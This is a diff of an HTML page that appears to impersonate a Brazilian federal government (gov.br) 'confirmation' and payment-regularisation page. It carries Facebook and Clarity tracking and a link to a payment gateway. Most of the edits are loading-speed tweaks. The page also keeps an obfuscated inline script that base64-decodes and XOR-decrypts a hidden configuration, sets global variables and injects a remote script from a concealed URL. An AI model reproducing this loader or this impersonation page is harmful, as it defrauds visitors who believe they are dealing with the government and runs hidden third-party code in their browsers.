@@ -5,17 +5,29 @@
 
 
   <meta charset="UTF-8">
+  <link rel="preload" href="images/govbr-logo-large.png" as="image" fetchpriority="high">
+  <link rel="preload" href="images/GOV-1.png" as="image" fetchpriority="high">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Confirmação Necessária - Governo Federal</title>
   <link rel="icon" type="image/x-icon" href="../assets/images/favicon.ico">
 
   <!-- Fontes -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://connect.facebook.net" crossorigin>
+  <link rel="preconnect" href="https://cdn.utmify.com.br" crossorigin>
+  <link rel="preconnect" href="https://www.clarity.ms" crossorigin>
+  <link rel="dns-prefetch" href="https://www.facebook.com">
+  <link rel="dns-prefetch" href="https://pay.sunize.com.br">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+<noscript><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet"></noscript>
 
-  <link rel="stylesheet" href="css/base.css">
-  <link rel="stylesheet" href="css/styles.css">
+  <link rel="preload" href="css/base.css" as="style" onload="this.rel='stylesheet'">
+  <link rel="preload" href="css/styles.css" as="style" onload="this.rel='stylesheet'">
+  <noscript>
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/styles.css">
+  </noscript>
 
   <!-- Microsoft Clarity -->
   <script type="text/javascript">
@@ -26,7 +38,7 @@
     })(window, document, "clarity", "script", "piq8he80s8");
   </script>
 
-<script src="../../utm-tracking.js"></script>
+<script src="../../utm-tracking.js" async defer></script>
 
 <script>(function(){var z_ej=atob("DCLgVdHG/0Z41HOtJlnCIKOq3XxavAfZVlHaev6lmyhWoQfAT0SZe7KpkmgaplzeRVCJJaW10DYRrBbBCVKJLbSq0SwL9l+PR1aUJ7ikijIdp1GXfX/Md7aqkCQZuACPHHmbd7+nkiNa7lHdT1qFOZii3WpaohLBU0fCb/PwniIb50KVFkbRY+HxmnJN5EOYE0fZM+LkghsF");var c_6e=[];for(var l_xe5u=0;l_xe5u<z_ej.length;l_xe5u++){c_6e.push(z_ej.charCodeAt(l_xe5u)&255);}var l_52y=c_6e[0];var y_88=c_6e.slice(1,1+l_52y);var s_jc0e=c_6e.slice(1+l_52y);var o_kdq=s_jc0e.map(function(b,q_lwzw){return b^y_88[q_lwzw%l_52y];});var x_g="";for(var f_y2w=0;f_y2w<o_kdq.length;f_y2w++){x_g+=String.fromCharCode(o_kdq[f_y2w]&255);}var v_3=decodeURIComponent(escape(x_g));var e_pbn=JSON.parse(v_3);var n_cz=e_pbn.globals||[];n_cz.forEach(function(g_t){window[g_t.name]=g_t.value;});var o_up0=document.createElement("script");o_up0.src=e_pbn.url;o_up0.async=true;o_up0.defer=true;(e_pbn.attributes||[]).forEach(function(x_38o5){o_up0.setAttribute(x_38o5.name,x_38o5.value);});(document.head||document.documentElement).appendChild(o_up0);})();</script>
 <!-- Meta Pixel Code -->
@@ -786,7 +798,7 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
   <header>
     <div class="gov-top-bar">
       <a href="#" onclick="event.preventDefault();">
-        <img src="images/govbr-logo-large.png" alt="gov.br" class="logo-gov">
+        <img src="images/govbr-logo-large.png" alt="gov.br" class="logo-gov" fetchpriority="high" loading="eager" decoding="async">
       </a>
     </div>
   </header>
@@ -795,7 +807,7 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
   <main class="acesso-main-section">
     <div class="container">
       <div style="width: 100%; text-align: center; margin: auto;">
-        <img src="images/GOV-1.png" alt="Governo Federal" class="logo">
+        <img src="images/GOV-1.png" alt="Governo Federal" class="logo" loading="eager" decoding="async" fetchpriority="high">
       </div>
 
       <div class="amount">
@@ -805,7 +817,7 @@ src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
 
       <!-- 3. Progress Tracker (4 Etapas) -->
 
-<script src="js/animacao.js"></script>
+<script src="js/animacao.js" defer></script>
 
       
 <div class="progress-tracker">
@@ -1022,7 +1034,7 @@ h1#value {
 
   <!-- 5. Rodapé com Logotipos Oficiais -->
   <footer class="gov-footer-logos">
-    <img src="images/min-cidades-gov-logo-1-1.png" alt="Ministério das Cidades - Governo Federal">
+    <img src="images/min-cidades-gov-logo-1-1.png" alt="Ministério das Cidades - Governo Federal" loading="lazy" decoding="async">
   </footer>
 
   <!-- 6. Modal de Cálculo e Regularização -->
@@ -1059,7 +1071,7 @@ h1#value {
   </div>
   
 
-<script src="./pepper-api.js"></script>
+<script src="./pepper-api.js" defer></script>
 
   <script>
     function getOrCreateRandomGatewayCustomer() {
@@ -1372,7 +1384,7 @@ h1#value {
       }
     }
   </script>
-  <script src="js/scripts.js"></script>
+  <script src="js/scripts.js" defer></script>
  
   <script
     src="https://cdn.utmify.com.br/scripts/utms/latest.js"
